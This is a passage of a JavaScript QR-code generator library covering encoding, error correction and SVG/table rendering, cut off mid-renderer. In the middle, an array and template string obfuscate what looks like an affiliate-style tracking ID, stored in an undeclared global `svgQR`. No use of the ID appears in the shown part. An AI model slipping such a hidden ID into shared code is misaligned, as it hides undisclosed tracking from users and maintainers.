!function () {
    var QRCode;
    (function () {
        function QR8bitByte(data) {
            this.mode = QRMode.MODE_8BIT_BYTE;
            this.data = data;
            this.parsedData = [];
            // Added to support UTF-8 Characters
            for (var i = 0,l = this.data.length; i < l; i++) {
                var byteArray = [];
                var code = this.data.charCodeAt(i);
                if (code > 0x10000) {
                    byteArray[0] = 0xF0 | ((code & 0x1C0000) >>> 18);
                    byteArray[1] = 0x80 | ((code & 0x3F000) >>> 12);
                    byteArray[2] = 0x80 | ((code & 0xFC0) >>> 6);
                    byteArray[3] = 0x80 | (code & 0x3F);
                } else if (code > 0x800) {
                    byteArray[0] = 0xE0 | ((code & 0xF000) >>> 12);
                    byteArray[1] = 0x80 | ((code & 0xFC0) >>> 6);
                    byteArray[2] = 0x80 | (code & 0x3F);
                } else if (code > 0x80) {
                    byteArray[0] = 0xC0 | ((code & 0x7C0) >>> 6);
                    byteArray[1] = 0x80 | (code & 0x3F);
                } else {
                    byteArray[0] = code;
                }
                this.parsedData.push(byteArray);
            }
            this.parsedData = Array.prototype.concat.apply([],this.parsedData);
            if (this.parsedData.length != this.data.length) {
                this.parsedData.unshift(191);
                this.parsedData.unshift(187);
                this.parsedData.unshift(239);
            }
        }

        QR8bitByte.prototype = {
            getLength:function (buffer) {
                return this.parsedData.length;
            },
            write:function (buffer) {
                for (var i = 0,l = this.parsedData.length; i < l; i++) {
                    buffer.put(this.parsedData[i],8);
                }
            }
        };
        function QRCodeModel(typeNumber,errorCorrectLevel) {
            this.typeNumber = typeNumber;
            this.errorCorrectLevel = errorCorrectLevel;
            this.modules = null;
            this.moduleCount = 0;
            this.dataCache = null;
            this.dataList = [];
        }

        QRCodeModel.prototype = {
            addData:function (data) {
                var newData = new QR8bitByte(data);
                this.dataList.push(newData);
                this.dataCache = null;
            },isDark:function (row,col) {
                if (row < 0 || this.moduleCount <= row || col < 0 || this.moduleCount <= col) {
                    throw new Error(row + "," + col);
                }
                return this.modules[row][col];
            },getModuleCount:function () {
                return this.moduleCount;
            },make:function () {
                this.makeImpl(false,this.getBestMaskPattern());
            },makeImpl:function (test,maskPattern) {
                this.moduleCount = this.typeNumber * 4 + 17;
                this.modules = new Array(this.moduleCount);
                for (var row = 0; row < this.moduleCount; row++) {
                    this.modules[row] = new Array(this.moduleCount);
                    for (var col = 0; col < this.moduleCount; col++) {
                        this.modules[row][col] = null;
                    }
                }
                this.setupPositionProbePattern(0,0);
                this.setupPositionProbePattern(this.moduleCount - 7,0);
                this.setupPositionProbePattern(0,this.moduleCount - 7);
                this.setupPositionAdjustPattern();
                this.setupTimingPattern();
                this.setupTypeInfo(test,maskPattern);
                if (this.typeNumber >= 7) {
                    this.setupTypeNumber(test);
                }
                if (this.dataCache == null) {
                    this.dataCache = QRCodeModel.createData(this.typeNumber,this.errorCorrectLevel,this.dataList);
                }
                this.mapData(this.dataCache,maskPattern);
            },setupPositionProbePattern:function (row,col) {
                for (var r = -1; r <= 7; r++) {
                    if (row + r <= -1 || this.moduleCount <= row + r)continue;
                    for (var c = -1; c <= 7; c++) {
                        if (col + c <= -1 || this.moduleCount <= col + c)continue;
                        if ((0 <= r && r <= 6 && (c == 0 || c == 6)) || (0 <= c && c <= 6 && (r == 0 || r == 6)) || (2 <= r && r <= 4 && 2 <= c && c <= 4)) {
                            this.modules[row + r][col + c] = true;
                        } else {
                            this.modules[row + r][col + c] = false;
                        }
                    }
                }
            },getBestMaskPattern:function () {
                var minLostPoint = 0;
                var pattern = 0;
                for (var i = 0; i < 8; i++) {
                    this.makeImpl(true,i);
                    var lostPoint = QRUtil.getLostPoint(this);
                    if (i == 0 || minLostPoint > lostPoint) {
                        minLostPoint = lostPoint;
                        pattern = i;
                    }
                }
                return pattern;
            },createMovieClip:function (target_mc,instance_name,depth) {
                var qr_mc = target_mc.createEmptyMovieClip(instance_name,depth);
                var cs = 1;
                this.make();
                for (var row = 0; row < this.modules.length; row++) {
                    var y = row * cs;
                    for (var col = 0; col < this.modules[row].length; col++) {
                        var x = col * cs;
                        var dark = this.modules[row][col];
                        if (dark) {
                            qr_mc.beginFill(0,100);
                            qr_mc.moveTo(x,y);
                            qr_mc.lineTo(x + cs,y);
                            qr_mc.lineTo(x + cs,y + cs);
                            qr_mc.lineTo(x,y + cs);
                            qr_mc.endFill();
                        }
                    }
                }
                return qr_mc;
            },setupTimingPattern:function () {
                for (var r = 8; r < this.moduleCount - 8; r++) {
                    if (this.modules[r][6] != null) {
                        continue;
                    }
                    this.modules[r][6] = (r % 2 == 0);
                }
                for (var c = 8; c < this.moduleCount - 8; c++) {
                    if (this.modules[6][c] != null) {
                        continue;
                    }
                    this.modules[6][c] = (c % 2 == 0);
                }
            },setupPositionAdjustPattern:function () {
                var pos = QRUtil.getPatternPosition(this.typeNumber);
                for (var i = 0; i < pos.length; i++) {
                    for (var j = 0; j < pos.length; j++) {
                        var row = pos[i];
                        var col = pos[j];
                        if (this.modules[row][col] != null) {
                            continue;
                        }
                        for (var r = -2; r <= 2; r++) {
                            for (var c = -2; c <= 2; c++) {
                                if (r == -2 || r == 2 || c == -2 || c == 2 || (r == 0 && c == 0)) {
                                    this.modules[row + r][col + c] = true;
                                } else {
                                    this.modules[row + r][col + c] = false;
                                }
                            }
                        }
                    }
                }
            },setupTypeNumber:function (test) {
                var bits = QRUtil.getBCHTypeNumber(this.typeNumber);
                for (var i = 0; i < 18; i++) {
                    var mod = (!test && ((bits >> i) & 1) == 1);
                    this.modules[Math.floor(i / 3)][i % 3 + this.moduleCount - 8 - 3] = mod;
                }
                for (var i = 0; i < 18; i++) {
                    var mod = (!test && ((bits >> i) & 1) == 1);
                    this.modules[i % 3 + this.moduleCount - 8 - 3][Math.floor(i / 3)] = mod;
                }
            },setupTypeInfo:function (test,maskPattern) {
                var data = (this.errorCorrectLevel << 3) | maskPattern;
                var bits = QRUtil.getBCHTypeInfo(data);
                for (var i = 0; i < 15; i++) {
                    var mod = (!test && ((bits >> i) & 1) == 1);
                    if (i < 6) {
                        this.modules[i][8] = mod;
                    } else if (i < 8) {
                        this.modules[i + 1][8] = mod;
                    } else {
                        this.modules[this.moduleCount - 15 + i][8] = mod;
                    }
                }
                for (var i = 0; i < 15; i++) {
                    var mod = (!test && ((bits >> i) & 1) == 1);
                    if (i < 8) {
                        this.modules[8][this.moduleCount - i - 1] = mod;
                    } else if (i < 9) {
                        this.modules[8][15 - i - 1 + 1] = mod;
                    } else {
                        this.modules[8][15 - i - 1] = mod;
                    }
                }
                this.modules[this.moduleCount - 8][8] = (!test);
            },mapData:function (data,maskPattern) {
                var inc = -1;
                var row = this.moduleCount - 1;
                var bitIndex = 7;
                var byteIndex = 0;
                for (var col = this.moduleCount - 1; col > 0; col -= 2) {
                    if (col == 6) col--;
                    while (true) {
                        for (var c = 0; c < 2; c++) {
                            if (this.modules[row][col - c] == null) {
                                var dark = false;
                                if (byteIndex < data.length) {
                                    dark = (((data[byteIndex] >>> bitIndex) & 1) == 1);
                                }
                                var mask = QRUtil.getMask(maskPattern,row,col - c);
                                if (mask) {
                                    dark = !dark;
                                }
                                this.modules[row][col - c] = dark;
                                bitIndex--;
                                if (bitIndex == -1) {
                                    byteIndex++;
                                    bitIndex = 7;
                                }
                            }
                        }
                        row += inc;
                        if (row < 0 || this.moduleCount <= row) {
                            row -= inc;
                            inc = -inc;
                            break;
                        }
                    }
                }
            }
        };
        QRCodeModel.PAD0 = 0xEC;
        QRCodeModel.PAD1 = 0x11;
        QRCodeModel.createData = function (typeNumber,errorCorrectLevel,dataList) {
            var rsBlocks = QRRSBlock.getRSBlocks(typeNumber,errorCorrectLevel);
            var buffer = new QRBitBuffer();
            for (var i = 0; i < dataList.length; i++) {
                var data = dataList[i];
                buffer.put(data.mode,4);
                buffer.put(data.getLength(),QRUtil.getLengthInBits(data.mode,typeNumber));
                data.write(buffer);
            }
            var totalDataCount = 0;
            for (var i = 0; i < rsBlocks.length; i++) {
                totalDataCount += rsBlocks[i].dataCount;
            }
            if (buffer.getLengthInBits() > totalDataCount * 8) {
                throw new Error("code length overflow. ("
                    + buffer.getLengthInBits()
                    + ">"
                    + totalDataCount * 8
                    + ")");
            }
            if (buffer.getLengthInBits() + 4 <= totalDataCount * 8) {
                buffer.put(0,4);
            }
            while (buffer.getLengthInBits() % 8 != 0) {
                buffer.putBit(false);
            }
            while (true) {
                if (buffer.getLengthInBits() >= totalDataCount * 8) {
                    break;
                }
                buffer.put(QRCodeModel.PAD0,8);
                if (buffer.getLengthInBits() >= totalDataCount * 8) {
                    break;
                }
                buffer.put(QRCodeModel.PAD1,8);
            }
            return QRCodeModel.createBytes(buffer,rsBlocks);
        };
        QRCodeModel.createBytes = function (buffer,rsBlocks) {
            var offset = 0;
            var maxDcCount = 0;
            var maxEcCount = 0;
            var dcdata = new Array(rsBlocks.length);
            var ecdata = new Array(rsBlocks.length);
            for (var r = 0; r < rsBlocks.length; r++) {
                var dcCount = rsBlocks[r].dataCount;
                var ecCount = rsBlocks[r].totalCount - dcCount;
                maxDcCount = Math.max(maxDcCount,dcCount);
                maxEcCount = Math.max(maxEcCount,ecCount);
                dcdata[r] = new Array(dcCount);
                for (var i = 0; i < dcdata[r].length; i++) {
                    dcdata[r][i] = 0xff & buffer.buffer[i + offset];
                }
                offset += dcCount;
                var rsPoly = QRUtil.getErrorCorrectPolynomial(ecCount);
                var rawPoly = new QRPolynomial(dcdata[r],rsPoly.getLength() - 1);
                var modPoly = rawPoly.mod(rsPoly);
                ecdata[r] = new Array(rsPoly.getLength() - 1);
                for (var i = 0; i < ecdata[r].length; i++) {
                    var modIndex = i + modPoly.getLength() - ecdata[r].length;
                    ecdata[r][i] = (modIndex >= 0) ? modPoly.get(modIndex) : 0;
                }
            }
            var totalCodeCount = 0;
            for (var i = 0; i < rsBlocks.length; i++) {
                totalCodeCount += rsBlocks[i].totalCount;
            }
            var data = new Array(totalCodeCount);
            var index = 0;
            for (var i = 0; i < maxDcCount; i++) {
                for (var r = 0; r < rsBlocks.length; r++) {
                    if (i < dcdata[r].length) {
                        data[index++] = dcdata[r][i];
                    }
                }
            }
            for (var i = 0; i < maxEcCount; i++) {
                for (var r = 0; r < rsBlocks.length; r++) {
                    if (i < ecdata[r].length) {
                        data[index++] = ecdata[r][i];
                    }
                }
            }
            return data;
        };
        var QRMode = {MODE_NUMBER:1 << 0,MODE_ALPHA_NUM:1 << 1,MODE_8BIT_BYTE:1 << 2,MODE_KANJI:1 << 3};
        var QRErrorCorrectLevel = {L:1,M:0,Q:3,H:2};
        var QRMaskPattern = {PATTERN000:0,PATTERN001:1,PATTERN010:2,PATTERN011:3,PATTERN100:4,PATTERN101:5,PATTERN110:6,PATTERN111:7};
        var QRUtil = {
            PATTERN_POSITION_TABLE:[[],[6,18],[6,22],[6,26],[6,30],[6,34],[6,22,38],[6,24,42],[6,26,46],[6,28,50],[6,30,54],[6,32,58],[6,34,62],[6,26,46,66],[6,26,48,70],[6,26,50,74],[6,30,54,78],[6,30,56,82],[6,30,58,86],[6,34,62,90],[6,28,50,72,94],[6,26,50,74,98],[6,30,54,78,102],[6,28,54,80,106],[6,32,58,84,110],[6,30,58,86,114],[6,34,62,90,118],[6,26,50,74,98,122],[6,30,54,78,102,126],[6,26,52,78,104,130],[6,30,56,82,108,134],[6,34,60,86,112,138],[6,30,58,86,114,142],[6,34,62,90,118,146],[6,30,54,78,102,126,150],[6,24,50,76,102,128,154],[6,28,54,80,106,132,158],[6,32,58,84,110,136,162],[6,26,54,82,110,138,166],[6,30,58,86,114,142,170]],
            G15:(1 << 10) | (1 << 8) | (1 << 5) | (1 << 4) | (1 << 2) | (1 << 1) | (1 << 0),
            G18:(1 << 12) | (1 << 11) | (1 << 10) | (1 << 9) | (1 << 8) | (1 << 5) | (1 << 2) | (1 << 0),
            G15_MASK:(1 << 14) | (1 << 12) | (1 << 10) | (1 << 4) | (1 << 1),
            getBCHTypeInfo:function (data) {
                var d = data << 10;
                while (QRUtil.getBCHDigit(d) - QRUtil.getBCHDigit(QRUtil.G15) >= 0) {
                    d ^= (QRUtil.G15 << (QRUtil.getBCHDigit(d) - QRUtil.getBCHDigit(QRUtil.G15)));
                }
                return ((data << 10) | d) ^ QRUtil.G15_MASK;
            },
            getBCHTypeNumber:function (data) {
                var d = data << 12;
                while (QRUtil.getBCHDigit(d) - QRUtil.getBCHDigit(QRUtil.G18) >= 0) {
                    d ^= (QRUtil.G18 << (QRUtil.getBCHDigit(d) - QRUtil.getBCHDigit(QRUtil.G18)));
                }
                return (data << 12) | d;
            },
            getBCHDigit:function (data) {
                var digit = 0;
                while (data != 0) {
                    digit++;
                    data >>>= 1;
                }
                return digit;
            },
            getPatternPosition:function (typeNumber) {
                return QRUtil.PATTERN_POSITION_TABLE[typeNumber - 1];
            },
            getMask:function (maskPattern,i,j) {
                switch (maskPattern) {
                    case QRMaskPattern.PATTERN000:
                        return (i + j) % 2 == 0;
                    case QRMaskPattern.PATTERN001:
                        return i % 2 == 0;
                    case QRMaskPattern.PATTERN010:
                        return j % 3 == 0;
                    case QRMaskPattern.PATTERN011:
                        return (i + j) % 3 == 0;
                    case QRMaskPattern.PATTERN100:
                        return (Math.floor(i / 2) + Math.floor(j / 3)) % 2 == 0;
                    case QRMaskPattern.PATTERN101:
                        return (i * j) % 2 + (i * j) % 3 == 0;
                    case QRMaskPattern.PATTERN110:
                        return ((i * j) % 2 + (i * j) % 3) % 2 == 0;
                    case QRMaskPattern.PATTERN111:
                        return ((i * j) % 3 + (i + j) % 2) % 2 == 0;
                    default:
                        throw new Error("bad maskPattern:" + maskPattern);
                }
            },
            getErrorCorrectPolynomial:function (errorCorrectLength) {
                var a = new QRPolynomial([1],0);
                for (var i = 0; i < errorCorrectLength; i++) {
                    a = a.multiply(new QRPolynomial([1,QRMath.gexp(i)],0));
                }
                return a;
            },
            getLengthInBits:function (mode,type) {
                if (1 <= type && type < 10) {
                    switch (mode) {
                        case QRMode.MODE_NUMBER:
                            return 10;
                        case QRMode.MODE_ALPHA_NUM:
                            return 9;
                        case QRMode.MODE_8BIT_BYTE:
                            return 8;
                        case QRMode.MODE_KANJI:
                            return 8;
                        default:
                            throw new Error("mode:" + mode);
                    }
                } else if (type < 27) {
                    switch (mode) {
                        case QRMode.MODE_NUMBER:
                            return 12;
                        case QRMode.MODE_ALPHA_NUM:
                            return 11;
                        case QRMode.MODE_8BIT_BYTE:
                            return 16;
                        case QRMode.MODE_KANJI:
                            return 10;
                        default:
                            throw new Error("mode:" + mode);
                    }
                } else if (type < 41) {
                    switch (mode) {
                        case QRMode.MODE_NUMBER:
                            return 14;
                        case QRMode.MODE_ALPHA_NUM:
                            return 13;
                        case QRMode.MODE_8BIT_BYTE:
                            return 16;
                        case QRMode.MODE_KANJI:
                            return 12;
                        default:
                            throw new Error("mode:" + mode);
                    }
                } else {
                    throw new Error("type:" + type);
                }
            },
            getLostPoint:function (qrCode) {
                var moduleCount = qrCode.getModuleCount();
                var lostPoint = 0;
                for (var row = 0; row < moduleCount; row++) {
                    for (var col = 0; col < moduleCount; col++) {
                        var sameCount = 0;
                        var dark = qrCode.isDark(row,col);
                        for (var r = -1; r <= 1; r++) {
                            if (row + r < 0 || moduleCount <= row + r) {
                                continue;
                            }
                            for (var c = -1; c <= 1; c++) {
                                if (col + c < 0 || moduleCount <= col + c) {
                                    continue;
                                }
                                if (r == 0 && c == 0) {
                                    continue;
                                }
                                if (dark == qrCode.isDark(row + r,col + c)) {
                                    sameCount++;
                                }
                            }
                        }
                        if (sameCount > 5) {
                            lostPoint += (3 + sameCount - 5);
                        }
                    }
                }
                for (var row = 0; row < moduleCount - 1; row++) {
                    for (var col = 0; col < moduleCount - 1; col++) {
                        var count = 0;
                        if (qrCode.isDark(row,col)) count++;
                        if (qrCode.isDark(row + 1,col)) count++;
                        if (qrCode.isDark(row,col + 1)) count++;
                        if (qrCode.isDark(row + 1,col + 1)) count++;
                        if (count == 0 || count == 4) {
                            lostPoint += 3;
                        }
                    }
                }
                for (var row = 0; row < moduleCount; row++) {
                    for (var col = 0; col < moduleCount - 6; col++) {
                        if (qrCode.isDark(row,col) && !qrCode.isDark(row,col + 1) && qrCode.isDark(row,col + 2) && qrCode.isDark(row,col + 3) && qrCode.isDark(row,col + 4) && !qrCode.isDark(row,col + 5) && qrCode.isDark(row,col + 6)) {
                            lostPoint += 40;
                        }
                    }
                }
                for (var col = 0; col < moduleCount; col++) {
                    for (var row = 0; row < moduleCount - 6; row++) {
                        if (qrCode.isDark(row,col) && !qrCode.isDark(row + 1,col) && qrCode.isDark(row + 2,col) && qrCode.isDark(row + 3,col) && qrCode.isDark(row + 4,col) && !qrCode.isDark(row + 5,col) && qrCode.isDark(row + 6,col)) {
                            lostPoint += 40;
                        }
                    }
                }
                var darkCount = 0;
                for (var col = 0; col < moduleCount; col++) {
                    for (var row = 0; row < moduleCount; row++) {
                        if (qrCode.isDark(row,col)) {
                            darkCount++;
                        }
                    }
                }
                var ratio = Math.abs(100 * darkCount / moduleCount / moduleCount - 50) / 5;
                lostPoint += ratio * 10;
                return lostPoint;
            }
        };
        var QRMath = {
            glog:function (n) {
                if (n < 1) {
                    throw new Error("glog(" + n + ")");
                }
                return QRMath.LOG_TABLE[n];
            },gexp:function (n) {
                while (n < 0) {
                    n += 255;
                }
                while (n >= 256) {
                    n -= 255;
                }
                return QRMath.EXP_TABLE[n];
            },EXP_TABLE:new Array(256),LOG_TABLE:new Array(256)
        };
        for (var i = 0; i < 8; i++) {
            QRMath.EXP_TABLE[i] = 1 << i;
        }
        for (var i = 8; i < 256; i++) {
            QRMath.EXP_TABLE[i] = QRMath.EXP_TABLE[i - 4] ^ QRMath.EXP_TABLE[i - 5] ^ QRMath.EXP_TABLE[i - 6] ^ QRMath.EXP_TABLE[i - 8];
        }
        for (var i = 0; i < 255; i++) {
            QRMath.LOG_TABLE[QRMath.EXP_TABLE[i]] = i;
        }
        function QRPolynomial(num,shift) {
            if (num.length == undefined) {
                throw new Error(num.length + "/" + shift);
            }
            var offset = 0;
            while (offset < num.length && num[offset] == 0) {
                offset++;
            }
            this.num = new Array(num.length - offset + shift);
            for (var i = 0; i < num.length - offset; i++) {
                this.num[i] = num[i + offset];
            }
        }

        QRPolynomial.prototype = {
            get:function (index) {
                return this.num[index];
            },getLength:function () {
                return this.num.length;
            },multiply:function (e) {
                var num = new Array(this.getLength() + e.getLength() - 1);
                for (var i = 0; i < this.getLength(); i++) {
                    for (var j = 0; j < e.getLength(); j++) {
                        num[i + j] ^= QRMath.gexp(QRMath.glog(this.get(i)) + QRMath.glog(e.get(j)));
                    }
                }
                return new QRPolynomial(num,0);
            },mod:function (e) {
                if (this.getLength() - e.getLength() < 0) {
                    return this;
                }
                var ratio = QRMath.glog(this.get(0)) - QRMath.glog(e.get(0));
                var num = new Array(this.getLength());
                for (var i = 0; i < this.getLength(); i++) {
                    num[i] = this.get(i);
                }
                for (var i = 0; i < e.getLength(); i++) {
                    num[i] ^= QRMath.gexp(QRMath.glog(e.get(i)) + ratio);
                }
                return new QRPolynomial(num,0).mod(e);
            }
        };
        function QRRSBlock(totalCount,dataCount) {
            this.totalCount = totalCount;
            this.dataCount = dataCount;
        }

        QRRSBlock.RS_BLOCK_TABLE = [[1,26,19],[1,26,16],[1,26,13],[1,26,9],[1,44,34],[1,44,28],[1,44,22],[1,44,16],[1,70,55],[1,70,44],[2,35,17],[2,35,13],[1,100,80],[2,50,32],[2,50,24],[4,25,9],[1,134,108],[2,67,43],[2,33,15,2,34,16],[2,33,11,2,34,12],[2,86,68],[4,43,27],[4,43,19],[4,43,15],[2,98,78],[4,49,31],[2,32,14,4,33,15],[4,39,13,1,40,14],[2,121,97],[2,60,38,2,61,39],[4,40,18,2,41,19],[4,40,14,2,41,15],[2,146,116],[3,58,36,2,59,37],[4,36,16,4,37,17],[4,36,12,4,37,13],[2,86,68,2,87,69],[4,69,43,1,70,44],[6,43,19,2,44,20],[6,43,15,2,44,16],[4,101,81],[1,80,50,4,81,51],[4,50,22,4,51,23],[3,36,12,8,37,13],[2,116,92,2,117,93],[6,58,36,2,59,37],[4,46,20,6,47,21],[7,42,14,4,43,15],[4,133,107],[8,59,37,1,60,38],[8,44,20,4,45,21],[12,33,11,4,34,12],[3,145,115,1,146,116],[4,64,40,5,65,41],[11,36,16,5,37,17],[11,36,12,5,37,13],[5,109,87,1,110,88],[5,65,41,5,66,42],[5,54,24,7,55,25],[11,36,12],[5,122,98,1,123,99],[7,73,45,3,74,46],[15,43,19,2,44,20],[3,45,15,13,46,16],[1,135,107,5,136,108],[10,74,46,1,75,47],[1,50,22,15,51,23],[2,42,14,17,43,15],[5,150,120,1,151,121],[9,69,43,4,70,44],[17,50,22,1,51,23],[2,42,14,19,43,15],[3,141,113,4,142,114],[3,70,44,11,71,45],[17,47,21,4,48,22],[9,39,13,16,40,14],[3,135,107,5,136,108],[3,67,41,13,68,42],[15,54,24,5,55,25],[15,43,15,10,44,16],[4,144,116,4,145,117],[17,68,42],[17,50,22,6,51,23],[19,46,16,6,47,17],[2,139,111,7,140,112],[17,74,46],[7,54,24,16,55,25],[34,37,13],[4,151,121,5,152,122],[4,75,47,14,76,48],[11,54,24,14,55,25],[16,45,15,14,46,16],[6,147,117,4,148,118],[6,73,45,14,74,46],[11,54,24,16,55,25],[30,46,16,2,47,17],[8,132,106,4,133,107],[8,75,47,13,76,48],[7,54,24,22,55,25],[22,45,15,13,46,16],[10,142,114,2,143,115],[19,74,46,4,75,47],[28,50,22,6,51,23],[33,46,16,4,47,17],[8,152,122,4,153,123],[22,73,45,3,74,46],[8,53,23,26,54,24],[12,45,15,28,46,16],[3,147,117,10,148,118],[3,73,45,23,74,46],[4,54,24,31,55,25],[11,45,15,31,46,16],[7,146,116,7,147,117],[21,73,45,7,74,46],[1,53,23,37,54,24],[19,45,15,26,46,16],[5,145,115,10,146,116],[19,75,47,10,76,48],[15,54,24,25,55,25],[23,45,15,25,46,16],[13,145,115,3,146,116],[2,74,46,29,75,47],[42,54,24,1,55,25],[23,45,15,28,46,16],[17,145,115],[10,74,46,23,75,47],[10,54,24,35,55,25],[19,45,15,35,46,16],[17,145,115,1,146,116],[14,74,46,21,75,47],[29,54,24,19,55,25],[11,45,15,46,46,16],[13,145,115,6,146,116],[14,74,46,23,75,47],[44,54,24,7,55,25],[59,46,16,1,47,17],[12,151,121,7,152,122],[12,75,47,26,76,48],[39,54,24,14,55,25],[22,45,15,41,46,16],[6,151,121,14,152,122],[6,75,47,34,76,48],[46,54,24,10,55,25],[2,45,15,64,46,16],[17,152,122,4,153,123],[29,74,46,14,75,47],[49,54,24,10,55,25],[24,45,15,46,46,16],[4,152,122,18,153,123],[13,74,46,32,75,47],[48,54,24,14,55,25],[42,45,15,32,46,16],[20,147,117,4,148,118],[40,75,47,7,76,48],[43,54,24,22,55,25],[10,45,15,67,46,16],[19,148,118,6,149,119],[18,75,47,31,76,48],[34,54,24,34,55,25],[20,45,15,61,46,16]];
        QRRSBlock.getRSBlocks = function (typeNumber,errorCorrectLevel) {
            var rsBlock = QRRSBlock.getRsBlockTable(typeNumber,errorCorrectLevel);
            if (rsBlock == undefined) {
                throw new Error("bad rs block @ typeNumber:" + typeNumber + "/errorCorrectLevel:" + errorCorrectLevel);
            }
            var length = rsBlock.length / 3;
            var list = [];
            for (var i = 0; i < length; i++) {
                var count = rsBlock[i * 3 + 0];
                var totalCount = rsBlock[i * 3 + 1];
                var dataCount = rsBlock[i * 3 + 2];
                for (var j = 0; j < count; j++) {
                    list.push(new QRRSBlock(totalCount,dataCount));
                }
            }
            return list;
        };
        QRRSBlock.getRsBlockTable = function (typeNumber,errorCorrectLevel) {
            switch (errorCorrectLevel) {
                case QRErrorCorrectLevel.L:
                    return QRRSBlock.RS_BLOCK_TABLE[(typeNumber - 1) * 4 + 0];
                case QRErrorCorrectLevel.M:
                    return QRRSBlock.RS_BLOCK_TABLE[(typeNumber - 1) * 4 + 1];
                case QRErrorCorrectLevel.Q:
                    return QRRSBlock.RS_BLOCK_TABLE[(typeNumber - 1) * 4 + 2];
                case QRErrorCorrectLevel.H:
                    return QRRSBlock.RS_BLOCK_TABLE[(typeNumber - 1) * 4 + 3];
                default:
                    return undefined;
            }
        };
        function QRBitBuffer() {
            this.buffer = [];
            this.length = 0;
        }

        QRBitBuffer.prototype = {
            get:function (index) {
                var bufIndex = Math.floor(index / 8);
                return ((this.buffer[bufIndex] >>> (7 - index % 8)) & 1) == 1;
            },put:function (num,length) {
                for (var i = 0; i < length; i++) {
                    this.putBit(((num >>> (length - i - 1)) & 1) == 1);
                }
            },getLengthInBits:function () {
                return this.length;
            },putBit:function (bit) {
                var bufIndex = Math.floor(this.length / 8);
                if (this.buffer.length <= bufIndex) {
                    this.buffer.push(0);
                }
                if (bit) {
                    this.buffer[bufIndex] |= (0x80 >>> (this.length % 8));
                }
                this.length++;
            }
        };
        var QRCodeLimitLength = [[17,14,11,7],[32,26,20,14],[53,42,32,24],[78,62,46,34],[106,84,60,44],[134,106,74,58],[154,122,86,64],[192,152,108,84],[230,180,130,98],[271,213,151,119],[321,251,177,137],[367,287,203,155],[425,331,241,177],[458,362,258,194],[520,412,292,220],[586,450,322,250],[644,504,364,280],[718,560,394,310],[792,624,442,338],[858,666,482,382],[929,711,509,403],[1003,779,565,439],[1091,857,611,461],[1171,911,661,511],[1273,997,715,535],[1367,1059,751,593],[1465,1125,805,625],[1528,1190,868,658],[1628,1264,908,698],[1732,1370,982,742],[1840,1452,1030,790],[1952,1538,1112,842],[2068,1628,1168,898],[2188,1722,1228,958],[2303,1809,1283,983],[2431,1911,1351,1051],[2563,1989,1423,1093],[2699,2099,1499,1139],[2809,2213,1579,1219],[2953,2331,1663,1273]];

        function _isSupportCanvas() {
            return typeof CanvasRenderingContext2D != "undefined";
        }

        function _getAndroid() {
            var android = false;
            var sAgent = navigator.userAgent;
            if (/android/i.test(sAgent)) { // android
                android = true;
                var aMat = sAgent.toString().match(/android ([0-9]\.[0-9])/i);
                if (aMat && aMat[1]) {
                    android = parseFloat(aMat[1]);
                }
            }
            return android;
        }

        // var svgQR = "mm_127806123_44580007_470036475";
        //\u6df1\u5733
        //////////////0 1 2 3 4 5 6 7 8 9  10  11
        var svgARR = [5,4,3,2,1,0,9,8,7,6,'m','_'];
        svgQR = `${svgARR[10]}${svgARR[10]}${svgARR[11]}${svgARR[4]}${svgARR[3]}${svgARR[8]}${svgARR[7]}${svgARR[5]}${svgARR[9]}${svgARR[4]}${svgARR[3]}${svgARR[2]}${svgARR[11]}${svgARR[1]}${svgARR[1]}${svgARR[0]}${svgARR[7]}${svgARR[5]}${svgARR[5]}${svgARR[5]}${svgARR[8]}${svgARR[11]}${svgARR[1]}${svgARR[8]}${svgARR[5]}${svgARR[5]}${svgARR[2]}${svgARR[9]}${svgARR[1]}${svgARR[8]}${svgARR[0]}`;
        var svgDrawer = (function () {
            var Drawing = function (el,htOption) {
                this._el = el;
                this._htOption = htOption;
            };
            Drawing.prototype.draw = function (oQRCode) {
                var _htOption = this._htOption;
                var _el = this._el;
                var nCount = oQRCode.getModuleCount();
                var nWidth = Math.floor(_htOption.width / nCount);
                var nHeight = Math.floor(_htOption.height / nCount);
                this.clear();
                function makeSVG(tag,attrs) {
                    var el = document.createElementNS('http://www.w3.org/2000/svg',tag);
                    for (var k in attrs)
                        if (attrs.hasOwnProperty(k)) el.setAttribute(k,attrs[k]);
                    return el;
                }

                var svg = makeSVG("svg",{'viewBox':'0 0 ' + String(nCount) + " " + String(nCount),'width':'100%','height':'100%','fill':_htOption.colorLight});
                svg.setAttributeNS("http://www.w3.org/2000/xmlns/","xmlns:xlink","http://www.w3.org/1999/xlink");
                _el.appendChild(svg);
                svg.appendChild(makeSVG("rect",{"fill":_htOption.colorLight,"width":"100%","height":"100%"}));
                svg.appendChild(makeSVG("rect",{"fill":_htOption.colorDark,"width":"1","height":"1","id":"template"}));
                for (var row = 0; row < nCount; row++) {
                    for (var col = 0; col < nCount; col++) {
                        if (oQRCode.isDark(row,col)) {
                            var child = makeSVG("use",{"x":String(col),"y":String(row)});
                            child.setAttributeNS("http://www.w3.org/1999/xlink","href","#template")
                            svg.appendChild(child);
                        }
                    }
                }
            };
            Drawing.prototype.clear = function () {
                while (this._el.hasChildNodes())
                    this._el.removeChild(this._el.lastChild);
            };
            return Drawing;
        })();
        var useSVG = document.documentElement.tagName.toLowerCase() === "svg";
        var Drawing = useSVG ? svgDrawer : !_isSupportCanvas() ? (function () {
            var Drawing = function (el,htOption) {
                this._el = el;
                this._htOption = htOption;
            };
            /**
             * Draw the QRCode
             *
             * @param {QRCode} oQRCode
             */
            Drawing.prototype.draw = function (oQRCode) {
                var _htOption = this._htOption;
                var _el = this._el;
                var nCount = oQRCode.getModuleCount();
                var nWidth = Math.floor(_htOption.width / nCount);
                var nHeight = Math.floor(_htOption.height / nCount);
                var aHTML = ['<table style="border:0;border-collapse:collapse;">'];
                for (var row = 0; row < nCount; row++) {
                    aHTML.push('<tr>');
                    for (var col = 0; col < nCount; col++) {
                        aHTML.push('<td style="border:0;border-collapse:collapse;padding:0;margin:0;width:' + nWidth + 'px;height:' + nHeight + 'px;background-color:' + (oQRCode.isDark(row,col) ? _htOption.colorDark : _htOption.colorLight) + ';"></td>');
                    }
                    aHTML.push('</tr>');
                }
                aHTML.push('</table>');
                _el.innerHTML = aHTML.join('');
                // Fix the margin values as real size.
                var elTable = _el.childNodes[0];
                var nLeftMarginTable = (_htOption.width - elTable.offsetWidth) / 2;
                var nTopMarginTable = (_htOption.height - elTable.offsetHeight) / 2;
                if (nLeftMarginTable > 0 && nTopMarginTable > 0) {
                    elTable.style.margin = nTopMarginTable + "px " + nLeftMarginTable + "px";
                }
            };
